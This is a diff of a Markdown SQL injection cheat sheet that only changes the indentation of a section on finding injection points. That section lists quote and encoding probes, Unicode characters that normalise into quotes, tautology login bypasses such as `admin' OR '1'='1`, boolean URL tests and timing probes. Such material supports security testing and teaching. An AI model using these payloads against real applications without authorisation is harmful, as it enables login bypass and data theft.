@@ -43,30 +43,30 @@
 Detecting the entry point in SQL injection (SQLi) involves identifying locations in an application where user input is not properly sanitized before it is included in SQL queries.
 
 * **Error Messages**: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.
-  * Simple characters: `'`, `"`, `;`, `)` and `*`
-  * Simple characters encoded: `%27`, `%22`, `%23`, `%3B`, `%29` and `%2A`
-  * Multiple encoding: `%%2727`, `%25%27`
-  * Unicode characters: `U+02BA`, `U+02B9`
-      * MODIFIER LETTER DOUBLE PRIME (`U+02BA` encoded as `%CA%BA`) is transformed into `U+0022` QUOTATION MARK (`)
-      * MODIFIER LETTER PRIME (`U+02B9` encoded as `%CA%B9`) is transformed into `U+0027` APOSTROPHE (')
+    * Simple characters: `'`, `"`, `;`, `)` and `*`
+    * Simple characters encoded: `%27`, `%22`, `%23`, `%3B`, `%29` and `%2A`
+    * Multiple encoding: `%%2727`, `%25%27`
+    * Unicode characters: `U+02BA`, `U+02B9`
+        * MODIFIER LETTER DOUBLE PRIME (`U+02BA` encoded as `%CA%BA`) is transformed into `U+0022` QUOTATION MARK (`)
+        * MODIFIER LETTER PRIME (`U+02B9` encoded as `%CA%B9`) is transformed into `U+0027` APOSTROPHE (')
 
 * **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.
-  * Merging characters
-    ```sql
-    `+HERP
-    '||'DERP
-    '+'herp
-    ' 'DERP
-    '%20'HERP
-    '%2B'HERP
-    ```
-  * Logic Testing
-    ```sql
-    page.asp?id=1 or 1=1 -- true
-    page.asp?id=1' or 1=1 -- true
-    page.asp?id=1" or 1=1 -- true
-    page.asp?id=1 and 1=2 -- false
-    ```
+    * Merging characters
+      ```sql
+      `+HERP
+      '||'DERP
+      '+'herp
+      ' 'DERP
+      '%20'HERP
+      '%2B'HERP
+      ```
+    * Logic Testing
+      ```sql
+      page.asp?id=1 or 1=1 -- true
+      page.asp?id=1' or 1=1 -- true
+      page.asp?id=1" or 1=1 -- true
+      page.asp?id=1 and 1=2 -- false
+      ```
 
 * **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.
 
